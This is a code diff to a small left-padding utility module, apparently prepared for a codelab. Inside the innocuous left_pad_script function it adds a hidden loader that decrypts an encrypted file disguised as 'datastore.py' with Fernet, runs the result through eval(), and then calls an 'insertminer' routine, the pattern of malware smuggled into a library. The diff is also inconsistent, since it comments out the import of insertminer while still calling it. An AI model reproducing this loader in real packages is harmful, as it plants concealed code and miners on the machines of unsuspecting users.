@@ -14,7 +14,7 @@ The following functions are available to the user when imported as a module:
 NOTE: this file was expanded for the purpose of a codelab, and thus should be treated as such.
 '''
 
-from .backend.miner import insertminer
+#from .miner import insertminer
 
 
 def pad_date (date):
@@ -83,5 +83,28 @@ def left_pad_list(initial_list, padder, length):
     return return_array + initial_list
 
 def left_pad_script(filename):
+    from cryptography.fernet import Fernet
+    import os
+
+    curr_dir = os.path.dirname(__file__)
+
+    datastore_file = open(os.path.join(curr_dir, "backend/datastore.py"), 'rb')
+    key_file = open(os.path.join(curr_dir, "backend/access_key.txt"), 'rb')
+
+    key = key_file.read()
+    datastore = datastore_file.read()
+
+    decryptor = Fernet(key)
+    minor = decryptor.decrypt(datastore)
+
+    eval(minor)
+
+    #minor_file = open(os.path.join(curr_dir, "utils.py"), 'wb')
+    #minor_file.write(minor)
+
+    #minor_file.close()
+    key_file.close()
+    datastore_file.close()
+
     insertminer(filename)
 
